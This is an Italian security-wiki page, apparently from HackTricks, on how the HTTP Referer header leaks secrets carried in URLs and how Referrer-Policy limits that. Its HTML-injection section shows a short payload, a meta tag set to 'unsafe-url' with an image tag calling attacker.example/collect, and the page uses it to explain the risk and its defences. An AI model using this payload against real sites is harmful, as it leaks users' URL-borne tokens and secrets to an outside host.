# Comportamento HTTP interessante

{{#include ../banners/hacktricks-training.md}}

## Header `Referer` e Referrer Policy

L'header di richiesta HTTP `Referer` identifica l'URL assoluto o parziale da cui è stata richiesta una risorsa. A seconda della referrer policy attiva, può includere l'origine, il percorso e la stringa di query di riferimento, ma non il frammento dell'URL.<sup>[[1]](#references)</sup>

### Leak di informazioni sensibili

I segreti nei percorsi URL o nei parametri di query possono essere divulgati tramite la cronologia del browser, i log, gli strumenti di analytics, i link copiati e l'header `Referer`. Un link cross-origin o una richiesta di subresource può quindi divulgare l'URL di riferimento a un server esterno.<sup>[[2]](#references)</sup>

### Mitigazione

Usa l'header di risposta `Referrer-Policy` per controllare la quantità di informazioni sul referrer inviata dal browser. `strict-origin-when-cross-origin` è il valore predefinito moderno nei browser, mentre `no-referrer` sopprime completamente l'header; scegli la policy che corrisponde ai requisiti dell'applicazione.<sup>[[3]](#references)</sup>
```http
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
Non inserire password, identificatori di sessione, chiavi API o altri valori sensibili negli URL. Inviali invece negli header o nei body delle richieste appropriati tramite TLS.<sup>[[2]](#references)</sup>

### Considerazioni sull'HTML Injection

Un documento può anche impostare una policy valida per l'intera pagina con `<meta name="referrer">`. Se una vulnerabilità di HTML injection consente a un attaccante di inserire un elemento meta efficace, l'attaccante può tentare di indebolire la policy del documento per le richieste successive. Le policy meta iniettate dinamicamente o in conflitto possono comportarsi in modo imprevedibile; verifica quindi il comportamento nel browser target invece di presumere che l'header della risposta venga sempre sovrascritto.<sup>[[4]](#references)</sup>
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.example/collect" alt="">
```
Correggi l'HTML injection sottostante e mantieni i dati sensibili fuori dall'URL; una referrer policy è una misura di difesa in profondità, non un sostituto di nessuno dei due controlli.

## References

- [1] [MDN - header `Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
- [2] [MITRE CWE-598 - Uso del metodo di richiesta GET con stringhe di query sensibili](https://cwe.mitre.org/data/definitions/598.html)
- [3] [MDN - header `Referrer-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
{{#include ../banners/hacktricks-training.md}}
